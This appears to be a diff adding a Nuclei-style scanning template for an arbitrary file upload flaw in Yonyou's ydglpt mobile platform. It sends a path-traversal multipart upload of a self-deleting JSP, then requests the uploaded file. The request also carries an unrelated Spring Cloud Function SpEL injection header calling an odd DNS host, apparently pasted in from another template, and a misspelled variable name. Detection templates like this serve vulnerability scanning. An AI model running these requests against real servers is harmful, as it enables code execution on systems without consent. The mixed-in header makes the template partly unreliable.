@@ -1,0 +1,50 @@
+id: yongyou-ydglpt-uploadComponent-upload
+info:
+  name: yongyou-ydglpt-uploadComponent-upload
+  author: yongyou-ydglpt-uploadComponent-upload
+  severity: critical
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{rand_base(15)}}"
+  filenametext: "{{to_lower(rand_base(6))}}"
+
+requests:
+  - raw:
+      - |
+        POST /mobsm/common/upload?category=../hotwebs/mobsm/uploadComponent HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
+        Content-Length: 183
+        Cache-Control: no-cache
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+        spring.cloud.function.routing-expression: T(java.net.InetAddress).getByName("cloud1.117.1696160557575.nuug.null")
+        Accept-Encoding: gzip, deflate
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+        Content-Type: text/plain
+
+        <%out.print(111 * 111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------{{boundary}}--
+
+
+      - |
+        GET {{jspfilenammme}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+        
+    extractors:
+      - type: regex
+        part: body
+        name: jspfilenammme
+        group: 1
+        internal: true
+        regex:
+          - '"path":"/../hotwebs(.*?)"' 
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body_1,"file","path") && contains(body_2,"12321")'
